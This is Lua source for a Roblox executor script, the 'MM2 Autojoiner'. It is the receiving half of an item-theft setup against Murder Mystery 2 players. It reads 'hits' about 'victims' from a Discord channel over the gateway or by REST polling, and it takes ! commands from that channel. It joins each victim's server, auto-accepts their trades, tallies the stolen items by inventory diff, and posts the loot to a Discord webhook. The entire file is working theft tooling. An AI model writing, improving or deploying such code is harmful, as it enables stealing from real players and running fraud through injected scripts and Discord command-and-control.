-- ═══════════════════════════════════════════════════════════════════════
-- MESSAGE PROCESSOR  (shared by gateway real-time events + REST fallback)
-- Handles commands, knownPlayers, hit parsing, dedup, reaction, mid-teleport switch
-- ═══════════════════════════════════════════════════════════════════════
local function processMsg(msg)
    if tostring(msg.channel_id) ~= tostring(chanelid) then return end
    local msgId = tostring(msg.id)

    -- Commands: non-webhook plain messages starting with !
    if not msg.webhook_id and msg.content then
        local cmd, args = msg.content:match("^!(%S+)%s*(.*)")
        if cmd then
            local author = msg.author or {}
            local sender = author.username or "unknown"
            -- Anyone who can type in the channel could previously drive the bot
            -- (!join, !serverhop, !norender). Gate on user ID when ajadmins is set.
            if author.bot then return end
            if ADMIN_ENFORCED and not ADMIN_IDS[tostring(author.id)] then
                logMsg("CMD !" .. cmd .. " from " .. sender .. " — DENIED (not in ajadmins)")
                return
            end
            task.spawn(function() handleCommand(cmd:lower(), sender, args or "") end)
        end
    end

    -- Collect author name for trade whitelist
    local embed = msg.embeds and msg.embeds[1]
    local name  = embed and embed.author and embed.author.name
    if name and name ~= "" and name ~= "Unknown" then
        getgenv()._aj_knownPlayers[name] = true
    end

    -- Skip if already processed (dedup)
    if isSeen(msgId) then return end

    local _ok, hit = pcall(parseHit, msg)
    if not (_ok and hit) then return end

    markSeen(msgId)
    task.spawn(function() reactOk(msgId) end)  -- react ✅ so transferer sees it was picked up

    -- Mid-teleport switch: if a better hit arrives while we're teleporting, jump to it
    local ch = getgenv()._aj_currentHit
    if getgenv()._aj_teleporting and ch and hit.value > ch.value then
        logMsg("Mid-teleport switch → " .. hit.playerName .. " (" .. commaNum(hit.value) .. " > " .. commaNum(ch.value) .. ")")
        -- Put the abandoned target back in the queue instead of dropping it —
        -- it is still a live hit, just a smaller one.
        visited[ch.jobId] = nil
        enqueue(ch)
        joinServer(hit)
        return
    end

    enqueue(hit)
    logMsg("Hit: " .. hit.playerName .. " · " .. commaNum(hit.value) .. " value")
    pcall(function()
        WindUI:Notify({
            Title = "Hit Detected",
            Desc  = hit.playerName .. " · " .. commaNum(hit.value) .. " value",
            Icon  = "target", Duration = 5,
        })
    end)
end

-- ═══════════════════════════════════════════════════════════════════════
-- DISCORD WEBSOCKET GATEWAY
-- Real-time message delivery via wss://gateway.discord.gg
-- Replaces REST polling — no delay, no rate limit spend on fetches.
-- Falls back to REST polling if WebSocket is not available.
-- Session/seq/resumeUrl survive teleports via getgenv() for RESUME.
-- ═══════════════════════════════════════════════════════════════════════
local function startGateway()
    if bottoken == "" then
        pcall(function() wsStatus:SetDesc("No token set") end)
        return
    end
    if not chanelid or chanelid == "" then
        pcall(function() wsStatus:SetDesc("No channel ID — check webhook URL") end)
        return
    end

    -- ── Startup REST scan ──────────────────────────────────────────────
    -- Gateway only delivers NEW messages; this catches hits posted before we connected.
    -- Also seeds knownPlayers from recent history.
    pcall(function()
        local msgs = recentMsgs(true)
        if not msgs then return end
        -- oldest-first so queue is sorted properly
        for i = #msgs, 1, -1 do
            local m = msgs[i]
            local embed = m.embeds and m.embeds[1]
            local n = embed and embed.author and embed.author.name
            if n and n ~= "" and n ~= "Unknown" then
                getgenv()._aj_knownPlayers[n] = true
            end
            if embed and not isDeadEmbed(embed) and not isSeen(tostring(m.id)) then
                local _ok, hit = pcall(parseHit, m)
                if _ok and hit then
                    markSeen(tostring(m.id))
                    enqueue(hit)
                    logMsg("Startup hit: " .. hit.playerName .. " · " .. commaNum(hit.value) .. " value")
                end
            end
        end
    end)

    -- ── REST polling fallback ──────────────────────────────────────────
    -- Used when the executor has no WebSocket, and also when the gateway
    -- repeatedly fails to reach READY (bad token / privileged intent not
    -- enabled) — previously that case just reconnected forever in silence.
    local restStarted = false
    local function startRestPolling(why)
        if restStarted then return end
        restStarted = true
        warn("[AJ GW] REST polling active — " .. why)
        pcall(function() wsStatus:SetDesc("REST polling — " .. why) end)

        local lastSeenId = loadBaseline()
        if not lastSeenId then
            local msgs = dJson({ Url = dchan("/messages?limit=1"), Method = "GET", Headers = dhdr() })
            if msgs and msgs[1] then lastSeenId = tostring(msgs[1].id); saveBaseline(lastSeenId) end
        end
        task.spawn(function()
            while alive() do
                task.wait(3)
                pcall(function()
                    local url = dchan("/messages?limit=10")
                    if lastSeenId then url = url .. "&after=" .. lastSeenId end
                    local msgs = dJson({ Url = url, Method = "GET", Headers = dhdr() })
                    if not msgs or #msgs == 0 then return end
                    for i = #msgs, 1, -1 do processMsg(msgs[i]) end
                    lastSeenId = tostring(msgs[1].id); saveBaseline(lastSeenId)
                    pcall(function() wsStatus:SetDesc("REST · " .. os.date("%H:%M:%S")) end)
                end)
            end
        end)
    end

    -- ── WebSocket Gateway ──────────────────────────────────────────────
    if not WebSocket then
        startRestPolling("no WebSocket in this executor")
        return
    end

    local gwConnId  = 0
    local gwFails   = 0   -- consecutive connects that never reached READY/RESUMED
    local gwSocket  = nil
    local helloGenId = 0
    local readyGenId = 0

    local function sendGW(op, d)
        if not gwSocket then return end
        pcall(function() gwSocket:Send(HttpService:JSONEncode({ op = op, d = d })) end)
    end

    local function connectGateway()
        if not alive() then return end
        gwConnId = gwConnId + 1
        local myId = gwConnId

        local url = "wss://gateway.discord.gg/?v=10&encoding=json"
        if getgenv()._aj_gwResume and getgenv()._aj_gwResumeUrl then
            url = getgenv()._aj_gwResumeUrl .. "/?v=10&encoding=json"
        end

        warn("[AJ GW] Connecting gen " .. myId)
        pcall(function() wsStatus:SetDesc("Gateway connecting...") end)

        -- IMPORTANT: do NOT wrap in pcall — it is a yielding call and wrapping it
        -- causes executors to return a dead socket that never receives HELLO.
        gwSocket = WebSocket.connect(url)

        if not gwSocket then
            warn("[AJ GW] connect returned nil, retrying in 5s")
            task.wait(5 + math.random() * 5)
            if gwConnId == myId and alive() then connectGateway() end
            return
        end

        -- Heartbeat ACK bookkeeping. Without this a socket that stays open but
        -- stops delivering (the classic silent-death of a 24/7 bot) is never
        -- noticed: we keep sending heartbeats into the void and no hit arrives.
        local lastBeatAt, lastAckAt = 0, tick()

        local function killSocket()
            pcall(function() if gwSocket then gwSocket:Close() end end)
        end

        gwSocket.OnMessage:Connect(function(raw)
            if gwConnId ~= myId then return end
            local data
            pcall(function() data = HttpService:JSONDecode(raw) end)
            if not data then return end

            if data.s then getgenv()._aj_gwSeq = data.s end

            -- op 10: HELLO — start heartbeat, then IDENTIFY or RESUME
            if data.op == 10 then
                helloGenId = myId
                local interval = data.d.heartbeat_interval / 1000
                if getgenv()._aj_gwResume and getgenv()._aj_gwSession and getgenv()._aj_gwSeq then
                    warn("[AJ GW] HELLO → RESUME")
                    sendGW(6, { token = bottoken, session_id = getgenv()._aj_gwSession, seq = getgenv()._aj_gwSeq })
                else
                    warn("[AJ GW] HELLO → IDENTIFY")
                    sendGW(2, {
                        token      = bottoken,
                        intents    = 33280,  -- GUILDS(1) + GUILD_MESSAGES(512) + MESSAGE_CONTENT(32768)
                        properties = { os = "linux", browser = "opsec", device = "desktop" },
                    })
                end
                lastAckAt = tick()
                task.spawn(function()
                    -- Spec: jitter the first beat so every bot doesn't beat in lockstep
                    task.wait(interval * math.random())
                    while gwConnId == myId and alive() do
                        if lastBeatAt > 0 and lastAckAt < lastBeatAt then
                            warn("[AJ GW] No HEARTBEAT_ACK — zombie socket, forcing resume")
                            pcall(function() wsStatus:SetDesc("Gateway zombie — resuming...") end)
                            getgenv()._aj_gwResume = true
                            killSocket()
                            break
                        end
                        lastBeatAt = tick()
                        sendGW(1, getgenv()._aj_gwSeq)
                        task.wait(interval)
                        if gwConnId ~= myId then break end
                    end
                end)
            end

            -- op 11: HEARTBEAT_ACK
            if data.op == 11 then lastAckAt = tick() end

            -- op 0: dispatch
            if data.op == 0 then
                if data.t == "READY" then
                    getgenv()._aj_gwSession   = data.d.session_id
                    getgenv()._aj_gwResumeUrl = data.d.resume_gateway_url
                    getgenv()._aj_gwResume    = true
                    readyGenId = myId
                    gwFails    = 0
                    warn("[AJ GW] READY")
                    pcall(function() wsStatus:SetDesc("Gateway live ✓ " .. os.date("%H:%M:%S")) end)
                elseif data.t == "RESUMED" then
                    readyGenId = myId
                    gwFails    = 0
                    warn("[AJ GW] RESUMED")
                    pcall(function() wsStatus:SetDesc("Gateway resumed ✓ " .. os.date("%H:%M:%S")) end)
                elseif data.t == "MESSAGE_CREATE" then
                    local msg = data.d
                    if tostring(msg.channel_id) == tostring(chanelid) then
                        task.spawn(function() processMsg(msg) end)
                    end
                end
            end

            -- op 7: server wants us to reconnect with RESUME
            if data.op == 7 then
                getgenv()._aj_gwResume = true
                killSocket()
            end

            -- op 9: invalid session — resume if d==true, else re-identify.
            -- The wait runs off-thread: yielding inside OnMessage stalls every
            -- later frame on this socket, including MESSAGE_CREATE.
            if data.op == 9 then
                getgenv()._aj_gwResume = (data.d == true)
                if not getgenv()._aj_gwResume then getgenv()._aj_gwSession = nil end
                task.spawn(function()
                    task.wait(math.random(1, 5))
                    killSocket()
                end)
            end
        end)

        gwSocket.OnClose:Connect(function()
            if gwConnId ~= myId then return end
            gwSocket = nil
            if readyGenId ~= myId then gwFails = gwFails + 1 end
            if gwFails >= 5 then
                warn("[AJ GW] 5 connects without READY — giving up on the gateway")
                startRestPolling("gateway refused (bad token or MESSAGE_CONTENT intent off?)")
                return
            end
            -- Exponential backoff so a refusing gateway isn't hammered
            local backoff = math.min(5 * (2 ^ gwFails), 120) + math.random() * 5
            warn("[AJ GW] Closed — reconnecting in " .. string.format("%.1f", backoff) .. "s")
            pcall(function() wsStatus:SetDesc("Gateway closed — reconnecting...") end)
            if getgenv()._aj_gwSession and getgenv()._aj_gwSeq then
                getgenv()._aj_gwResume = true
            end
            task.wait(backoff)
            if gwConnId == myId and alive() then connectGateway() end
        end)

        -- Watchdog: no HELLO in 6s = dead socket (TLS stall) → reconnect immediately
        task.spawn(function()
            task.wait(6)
            if gwConnId == myId and helloGenId ~= myId then
                warn("[AJ GW] No HELLO (dead socket), fast retry")
                gwFails = gwFails + 1
                killSocket()
                if gwFails >= 5 then
                    startRestPolling("gateway never sends HELLO")
                    return
                end
                if gwConnId == myId then gwSocket = nil; connectGateway() end
                return
            end
            -- HELLO received but no READY after 8s → rate limited, back off
            task.wait(8)
            if gwConnId == myId and readyGenId ~= myId then
                warn("[AJ GW] HELLO but no READY (rate limited?), backing off")
                killSocket()
                task.wait(3 + math.random() * 4)
                if gwConnId == myId then gwSocket = nil; connectGateway() end
            end
        end)
    end

    -- connectGateway is a local; call it in a task.spawn so alive() check works inside
    task.spawn(function()
        connectGateway()
    end)
end

-- ═══════════════════════════════════════════════════════════════════════
-- TRADE AUTO-ACCEPT
-- Only accepts requests from the current hit's victim. All others blocked.
-- AcceptTrade args: PlaceId * 3, LastOffer token (from UpdateTrade).
-- MM2 enforces a 6s cooldown before accepting — we wait 7s.
-- ═══════════════════════════════════════════════════════════════════════
task.spawn(function()
    if not alive() then return end
    local TradeRS = game:GetService("ReplicatedStorage"):WaitForChild("Trade", 20)
    if not TradeRS then warn("[MM2 Autojoiner] Trade folder not found"); return end

    local lastOffer = nil
    local inTrade   = false
    local conns     = {}  -- track connections so old gens don't accumulate

    -- Accept from: current victim OR anyone logged in the webhook channel
    local function isAllowed(player)
        local name = type(player) == "string" and player
                     or (pcall(function() return player.Name end) and player.Name)
                     or tostring(player)
        local ch = getgenv()._aj_currentHit
        if ch and ch.playerName == name then return true end
        return getgenv()._aj_knownPlayers[name] == true
    end

    -- Disconnect all trade listeners when this generation dies (prevents accumulation across teleports)
    task.spawn(function()
        while alive() do task.wait(5) end
        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
    end)

    -- Track the LastOffer token needed by AcceptTrade
    table.insert(conns, TradeRS.UpdateTrade.OnClientEvent:Connect(function(data)
        if not alive() then return end
        if data then lastOffer = data.LastOffer end
    end))

    -- Inventory snapshot helpers for claimed-item detection.
    -- Throttled: this is a full GetFullInventory round-trip and it used to fire
    -- on every incoming trade request, so anyone on the allow-list could stall
    -- the client just by spamming requests.
    local _snapCache, _snapCacheAt = nil, 0
    local function snapInventory(useCache)
        if useCache and _snapCache and (tick() - _snapCacheAt) < 5 then return _snapCache end
        local snap = {}
        pcall(function()
            local inv = game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(LP.Name)
            local db  = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
            for id, cnt in pairs((inv and inv.Weapons and inv.Weapons.Owned) or {}) do
                if (cnt or 0) > 0 then
                    local d = db[id]
                    snap[id] = { count = cnt, name = (d and d.ItemName) or id }
                end
            end
        end)
        _snapCache, _snapCacheAt = snap, tick()
        return snap
    end

    local preTradeSnap = nil

    -- Accept trade requests from victim / webhook-known players; explicitly decline others
    -- so their pending request doesn't block the victim's trade from coming through.
    pcall(function()
        TradeRS.SendRequest.OnClientInvoke = function(sender)
            if not isAllowed(sender) then
                task.delay(0.1, function()
                    pcall(function() TradeRS.DeclineRequest:FireServer() end)
                end)
                return false
            end
            -- Snapshot inventory before trade starts so we can diff after
            task.spawn(function() preTradeSnap = snapInventory(true) end)
            getgenv()._aj_lastTradeTime = os.time()
            setAction("Trade request accepted from " .. tostring(sender))
            task.delay(0.5, function()
                pcall(function() TradeRS.AcceptRequest:FireServer() end)
            end)
            return true
        end
    end)

    -- Backup: event path (some servers use FireClient instead of InvokeClient).
    -- Tracked in `conns` — untracked, re-executing the script stacked a second
    -- listener and every request got AcceptRequest fired twice.
    table.insert(conns, TradeRS.RequestSent.OnClientEvent:Connect(function(sender)
        if not isAllowed(sender) then
            task.delay(0.1, function()
                pcall(function() TradeRS.DeclineRequest:FireServer() end)
            end)
            return
        end
        task.spawn(function() preTradeSnap = snapInventory(true) end)
        getgenv()._aj_lastTradeTime = os.time()
        task.wait(0.5)
        pcall(function() TradeRS.AcceptRequest:FireServer() end)
    end))

    -- Safety: never confirm a trade where WE are the one giving items away.
    -- The old loop fired AcceptTrade on any StartTrade, so an allow-listed name
    -- could open a trade, put nothing in, and take whatever we had staged.
    local function ourSideIsEmpty(td)
        if type(td) ~= "table" then return true end   -- unknown shape: don't block the normal path
        local mine = td[LP.Name] or td.MyOffer or td.Offer
        if type(mine) ~= "table" then return true end
        for _, v in pairs(mine) do
            if type(v) == "number" and v > 0 then return false end
            if type(v) == "table" and next(v) ~= nil then return false end
        end
        return true
    end

    -- Shared polling-based accept loop (mirrors transferer's ReadyTrade).
    -- Launched by StartTrade event AND by post-accept request guard — whichever triggers first.
    -- Uses GetTradeStatus:InvokeServer() each tick so lastOffer is always fresh.
    local acceptLoopRunning = false
    local function startAcceptLoop()
        if acceptLoopRunning then return end
        acceptLoopRunning = true
        task.spawn(function()
            local cooldownExpiry = tick() + 2
            local deadline       = tick() + 50
            while tick() < deadline and alive() do
                local ok, status, td = pcall(function()
                    return TradeRS.GetTradeStatus:InvokeServer()
                end)
                if not ok then task.wait(0.3); continue end
                if status == "None" then break end
                if td and td.LastOffer then lastOffer = td.LastOffer end
                if status == "StartTrade" and lastOffer ~= nil and tick() >= cooldownExpiry then
                    if ourSideIsEmpty(td) then
                        pcall(function()
                            TradeRS.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
                        end)
                        setAction("AcceptTrade fired — waiting for server confirm")
                        task.wait(0.5)
                    else
                        warn("[AJ] Refusing to accept — our own offer is not empty")
                        setAction("⛔ Trade refused: our side is not empty")
                        pcall(function() TradeRS.DeclineTrade:FireServer() end)
                        break
                    end
                end
                task.wait(0.3)
            end
            acceptLoopRunning = false
        end)
    end

    -- Trade opened: launch polling accept loop
    table.insert(conns, TradeRS.StartTrade.OnClientEvent:Connect(function(tradeData, partnerName)
        local pname = type(partnerName) == "string" and partnerName
                      or pcall(function() return partnerName.Name end) and partnerName.Name
                      or tostring(partnerName)
        if not isAllowed(pname) then return end
        if tradeData then lastOffer = tradeData.LastOffer end
        inTrade = true
        getgenv()._aj_lastTradeTime = os.time()
        startAcceptLoop()
    end))

    -- Trade completed: detect received items via inventory diff, update stats, log webhook
    table.insert(conns, TradeRS.AcceptTrade.OnClientEvent:Connect(function(success)
        if not success then return end
        inTrade = false
        getgenv()._aj_lastTradeTime = os.time()

        -- Diff inventory to find what we actually received
        task.spawn(function()
            task.wait(3)  -- wait for server to update inventory after trade
            local postSnap = snapInventory()
            local snap = preTradeSnap or {}
            preTradeSnap = nil

            local receivedItems = {}
            local vc   = getValueCache()          -- scrapes only if the cache is stale
            local allV = (vc and vc.allV) or {}
            local chrV = (vc and vc.chrV) or {}

            for id, info in pairs(postSnap) do
                local before = snap[id] and snap[id].count or 0
                local gained = info.count - before
                if gained > 0 then
                    local itemName = info.name
                    -- Chromas live in their own table; looking them up in allV
                    -- returned 0 and undercounted every chroma claim.
                    local isChroma = tostring(id):find("Chroma", 1, true) ~= nil
                    local unit = isChroma
                        and (chrV[nrm((itemName:gsub("^[Cc]hroma ", "")))] or 0)
                        or  (allV[nrm(itemName)] or 0)
                    local val = unit * gained
                    table.insert(receivedItems, { name = itemName, amount = gained, value = val })
                    logMsg("Got: " .. itemName .. " x" .. gained .. " (" .. commaNum(val) .. " value)")
                    getgenv()._aj_lastWeapon = { name = itemName, amount = gained, value = val, ts = os.time() }
                end
            end

            local totalVal = 0
            for _, it in ipairs(receivedItems) do totalVal = totalVal + it.value end
            getgenv()._aj_sessionVal = (getgenv()._aj_sessionVal or 0) + totalVal
            getgenv()._aj_sessionHits = (getgenv()._aj_sessionHits or 0) + (#receivedItems > 0 and 1 or 0)

            -- Store last claim info for !lastclaim command
            local ch = getgenv()._aj_currentHit
            getgenv()._aj_lastClaimTime = os.time()
            getgenv()._aj_sessionClaims = (getgenv()._aj_sessionClaims or 0) + 1
            getgenv()._aj_lastClaimInfo = {
                playerName = ch and ch.playerName or "Unknown",
                items      = receivedItems,
                totalVal   = totalVal,
            }
            setAction("✅ Trade claimed from " .. (ch and ch.playerName or "?") .. " — +" .. commaNum(totalVal) .. " value")
            -- Tell the transferer's embed the hit is done instead of leaving it
            -- stuck on "🟡 Autojoining..." forever.
            if ch then
                task.spawn(function() patchHitStatus(ch, "✅ Claimed · +" .. commaNum(totalVal) .. " value") end)
            end

            if logid and logid ~= "" then
                local lines = {}
                for _, it in ipairs(receivedItems) do
                    table.insert(lines, it.name .. " x" .. it.amount .. "  (" .. commaNum(it.value) .. " value)")
                end
                local desc = #lines > 0 and table.concat(lines, "\n") or "items transferred (no diff)"
                task.spawn(function()
                    dreq({
                        Url     = logid,
                        Method  = "POST",
                        Headers = { ["Content-Type"] = "application/json" },
                        Body    = HttpService:JSONEncode({
                            embeds = {{
                                color       = 0x2ECC71,
                                title       = "✅ Trade claimed · +" .. commaNum(totalVal) .. " value",
                                description = "```\n" .. desc .. "\n```",
                                fields      = {
                                    { name = "From",          value = ch and ch.playerName or "Unknown",                        inline = true },
                                    { name = "Session Total", value = commaNum(getgenv()._aj_sessionVal or 0) .. " value", inline = true },
                                },
                                timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
                            }}
                        })
                    })
                end)
            end

        end)  -- end task.spawn
    end))
    table.insert(conns, TradeRS.DeclineTrade.OnClientEvent:Connect(function()
        inTrade = false
        preTradeSnap = nil
    end))

    -- Race-condition guard: poll for a missed ReceivingRequest or StartTrade.
    -- Adaptive interval — 1.5s while we're on a hit, 8s when idle. The old fixed
    -- 2s meant a remote round-trip every 2s for the entire 24/7 session, and it
    -- also raced the accept loop's own polling.
    task.spawn(function()
        task.wait(1)
        while alive() do
            if not alive() then break end
            if acceptLoopRunning then task.wait(1); continue end
            pcall(function()
                local status, td = TradeRS.GetTradeStatus:InvokeServer()
                if status == "ReceivingRequest" then
                    warn("[AJ] Pending ReceivingRequest detected — accepting")
                    task.spawn(function() preTradeSnap = snapInventory(true) end)
                    getgenv()._aj_lastTradeTime = os.time()
                    task.delay(0.3, function()
                        pcall(function() TradeRS.AcceptRequest:FireServer() end)
                    end)
                    task.wait(1)
                    startAcceptLoop()
                elseif status == "StartTrade" and not acceptLoopRunning then
                    -- Only accept if we're in a hit server (prevents accepting random trades when idle)
                    if getgenv()._aj_currentHit then
                        warn("[AJ] StartTrade detected by poll but event missed — launching accept loop")
                        if td and td.LastOffer then lastOffer = td.LastOffer end
                        inTrade = true
                        getgenv()._aj_lastTradeTime = os.time()
                        startAcceptLoop()
                    end
                end
            end)
            task.wait(getgenv()._aj_currentHit and 1.5 or 8)
        end
    end)
end)

-- (claimed item watcher removed — autojoiner uses inventory diff instead)

-- ═══════════════════════════════════════════════════════════════════════
-- MAIN JOIN LOOP
-- Move on when:
--   1. Victim leaves the server  (checked after 10s grace period)
--   2. No trade activity for 60 seconds (from join or last trade)
-- ═══════════════════════════════════════════════════════════════════════
task.spawn(function()
    -- State recovery: if getgenv was wiped by the executor's auto-rerun,
    -- match game.JobId against recent Discord embeds to find our target.
    -- Runs here (inside task.spawn) so it never blocks the main thread or WindUI.
    if not getgenv()._aj_currentHit and chanelid ~= "" then
        pcall(function()
            local detected = detectCurrentHit()
            if detected then
                getgenv()._aj_currentHit    = detected
                getgenv()._aj_inServerSince = os.time()
                getgenv()._aj_lastTradeTime = os.time()
                getgenv()._aj_done          = false
                getgenv()._aj_doneReason    = ""
                visited[detected.jobId]     = true
                warn("[AJ] Recovered target: " .. detected.playerName)
            end
        end)
    end

    -- Give the server time to fully load on first spawn after teleport
    if getgenv()._aj_currentHit then task.wait(8) end

    while alive() do
        task.wait(1)
        if paused then continue end

        local ch = getgenv()._aj_currentHit

        if ch and not getgenv()._aj_done then
            local timeInServer = os.time() - (getgenv()._aj_inServerSince or os.time())

            -- Condition 1: victim left (only check after 10s so server has time to populate).
            -- FindFirstChild matched Name only — when the transferer's embed carries
            -- a display name instead, that never matched and every hit was declared
            -- "victim left" 10s after landing. Match either, case-insensitively.
            if timeInServer >= 10 and not victimPresent(ch.playerName) then
                getgenv()._aj_done       = true
                getgenv()._aj_doneReason = "Victim left"
                setAction("⚠️ Victim left — moving on")
            end

            -- Condition 2: victim present but no trade activity for 90s
            -- Reset timer while victim is in server so we don't bail mid-round.
            -- Only count down when victim is actually here and no active trade.
            local lastT = getgenv()._aj_lastTradeTime or 0
            if victimPresent(ch.playerName) then
                -- victim still here — keep resetting if no trade has started yet
                if lastT == 0 then
                    getgenv()._aj_lastTradeTime = os.time()
                end
            end
            if lastT > 0 and os.time() - lastT >= 90 then
                getgenv()._aj_done       = true
                getgenv()._aj_doneReason = "No trade for 90s"
            end
        end

        -- Clear state and immediately look for next hit
        if getgenv()._aj_done and ch then
            local reason = getgenv()._aj_doneReason
            logMsg("Done: " .. ch.playerName .. " — " .. (reason ~= "" and reason or "moving on"))
            -- Only report a *failure* here; a successful claim already patched
            -- the embed with its own value line.
            if reason ~= "" and reason ~= "Skipped" and (getgenv()._aj_lastClaimTime or 0) < (getgenv()._aj_inServerSince or 0) then
                local _ch = ch
                task.spawn(function() patchHitStatus(_ch, "⚪ Autojoiner left · " .. reason) end)
            end
            pcall(function()
                WindUI:Notify({ Title = "Moving on", Desc = reason ~= "" and reason or "Done", Icon = "arrow-right", Duration = 2 })
            end)
            getgenv()._aj_claimedTotal  = 0
            getgenv()._aj_currentHit    = nil
            getgenv()._aj_done          = false
            getgenv()._aj_doneReason    = ""
            getgenv()._aj_inServerSince = 0
            getgenv()._aj_lastTradeTime = 0
        end

        -- Jump to the highest-value queued hit immediately.
        -- Loop through stale hits without waiting so we land on a live one fast.
        if not getgenv()._aj_currentHit and #hitQueue > 0 then
            -- `nxt`, not `next` — the old name shadowed the Lua builtin.
            local nxt = dequeue()
            while nxt do
                if isHitStillLive(nxt) then
                    logMsg("Joining: " .. nxt.playerName .. " · " .. commaNum(nxt.value) .. " value")
                    setAction("🚀 Joining " .. nxt.playerName .. " (" .. commaNum(nxt.value) .. " value)")
                    pcall(function()
                        WindUI:Notify({
                            Title = "Joining",
                            Desc  = nxt.playerName .. " · " .. commaNum(nxt.value) .. " value",
                            Icon  = "log-in", Duration = 4,
                        })
                    end)
                    getgenv()._aj_currentHit = nxt
                    joinServer(nxt)
                    task.wait(10)
                    getgenv()._aj_teleporting = false
                    break
                else
                    logMsg("Skip: " .. nxt.playerName .. " — Left Server")
                    getgenv()._aj_lastFailedHit = nxt
                    nxt = dequeue()
                end
            end
        end
    end
end)

-- ═══════════════════════════════════════════════════════════════════════
-- START — derive chanelid from webhookurl if not set directly
-- ═══════════════════════════════════════════════════════════════════════
if (chanelid == "" or not chanelid) and webhookurl and webhookurl ~= "" then
    local wh = dJson({ Url = webhookurl, Method = "GET" })
    if wh and wh.channel_id then chanelid = tostring(wh.channel_id) end
end
if not chanelid or chanelid == "" then
    warn("[MM2 Autojoiner] Could not resolve channel ID from webhook. Set chanelid manually.")
end
if logid == "" then logid = webhookurl end
if not ADMIN_ENFORCED then
    warn("[MM2 Autojoiner] ajadmins is empty — anyone in the channel can run ! commands.")
end

startGateway()

-- `visited` is keyed by jobId and never pruned; over a multi-day session it is
-- the one table that grows without bound. Message-level dedup is file-backed,
-- so dropping the oldest entries here is safe.
task.spawn(function()
    while alive() do
        task.wait(600)
        local n = 0
        for _ in pairs(visited) do n = n + 1 end
        if n > 400 then
            local cur = tostring(game.JobId)
            for k in pairs(visited) do
                if k ~= cur then visited[k] = nil end
            end
            visited[cur] = true
            logMsg("Pruned visited-server list (" .. n .. " entries)")
        end
    end
end)

-- Pre-load mm2values.com cache in background so item values in trade webhooks are never 0,
-- then refresh it every 30 min so a multi-day session never drifts stale.
task.spawn(function()
    while alive() do
        local c = getValueCache()
        if c and next(c.allV or {}) then warn("[AJ] Value cache loaded") end
        task.wait(VALUE_TTL)
    end
end)

-- Periodic GC. A 24/7 session accumulates a lot of short-lived request/JSON
-- garbage; letting it pile up is what turns a two-day uptime into a crash.
task.spawn(function()
    while alive() do
        task.wait(300)
        pcall(function() collectgarbage("collect") end)
    end
end)
